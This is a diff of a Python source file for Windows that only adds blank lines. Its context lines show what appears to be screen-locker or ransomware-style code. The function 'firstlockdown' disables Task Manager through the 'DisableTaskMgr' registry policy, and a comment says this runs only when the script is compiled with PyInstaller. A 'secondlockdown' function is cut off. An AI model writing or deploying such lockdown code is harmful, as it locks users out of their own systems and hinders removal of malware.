@@ -1,9 +1,11 @@
 import win32gui, win32con, os, sys, winreg
 
+
 # Set Registry Values for disabling Task Manager
 registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 registry_name: str = "DisableTaskMgr"
 value: int = 1
+
 
 def firstlockdown():
     # Check if we are running in a compiled pyinstaller .exe, if not, don't run lockdown code
@@ -32,6 +34,7 @@ def firstlockdown():
         reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_DWORD, value)
         winreg.CloseKey(reg_key)
+
 
 def secondlockdown():
     # Check if we are running in a compiled pyinstaller .exe, if not, don't run lockdown code
